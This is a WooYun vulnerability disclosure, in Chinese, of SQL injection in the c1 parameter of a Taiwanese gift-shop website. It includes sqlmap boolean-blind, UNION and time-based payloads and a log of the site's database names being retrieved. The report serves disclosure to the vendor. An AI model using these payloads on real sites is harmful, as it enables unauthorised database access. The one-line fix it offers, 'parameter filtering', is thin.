wybug_title: 台灣禮品館某处SQL注射（臺灣地區）

wybug_detail: 漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-15：	厂商已经确认，细节仅向厂商公开									2015-12-25：	细节向核心白帽子及相关领域专家公开									2016-01-04：	细节向普通白帽子公开									2016-01-14：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 台灣禮品館sql注射 详细说明：  台灣禮品館sql注射链接:http://**.**.**.**/product_list.php?c1=5注入参数：Parameter: c1 (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: c1=5' AND 4638=4638 AND 'RJkH'='RJkH   漏洞证明：  Parameter: c1 (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: c1=5' AND 4638=4638 AND 'RJkH'='RJkH    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: c1=-1861' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707a71,0x6f46576f715359495546,0x717a6b7171),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: c1=5' AND SLEEP(5) AND 'zHgQ'='zHgQ---[23:49:11] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.5.13back-end DBMS: MySQL 5.0.11[23:49:11] [INFO] fetching database names[23:49:13] [WARNING] the SQL query provided does not return any output[23:49:13] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[23:49:13] [INFO] fetching number of databases[23:49:13] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[23:49:13] [INFO] retrieved: 2[23:49:28] [INFO] retrieved: information_schema[23:54:37] [INFO] retrieved: taiwangoods_dbavailable databases [2]:[*] information_schema[*] taiwangoods_db   修复方案：  参数过滤！   版权声明：转载请注明来源 路人甲@乌云
